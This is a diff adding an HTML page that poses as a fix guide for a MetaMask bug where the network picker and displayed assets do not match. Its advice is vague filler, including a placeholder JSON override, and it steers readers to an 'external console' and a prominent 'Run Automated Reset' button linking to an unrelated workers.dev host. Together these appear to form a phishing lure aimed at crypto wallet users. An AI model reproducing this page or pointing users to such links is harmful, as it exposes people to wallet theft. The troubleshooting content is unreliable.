@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Miss Match Between Network Picker – Fix Guide</title>
+<style>
+    body {
+        font-family: system-ui;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #cf6679;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users observe a mismatch between the network selected in the Metamask extension's network picker and the assets displayed in the modal, which shows "All popular" assets, potentially causing confusion and incorrect transactions on the Ethereum (ETH) network.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a bug in the Metamask extension that fails to update the asset list according to the chosen network, leading to a discrepancy between the expected and actual assets displayed.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Attempt to refresh the Metamask extension and retry the transaction.</li>
+<li>Manually add the correct network and asset details in the extension's settings.</li>
+<li>Utilize the following JSON configuration to override the default asset settings:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;assets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...asset_address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more granular control over network and asset configurations.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured on the browser.</li>
+<li>Ethereum (ETH) network selected in the extension's network picker.</li>
+<li>The user has a basic understanding of blockchain and wallet interactions.</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
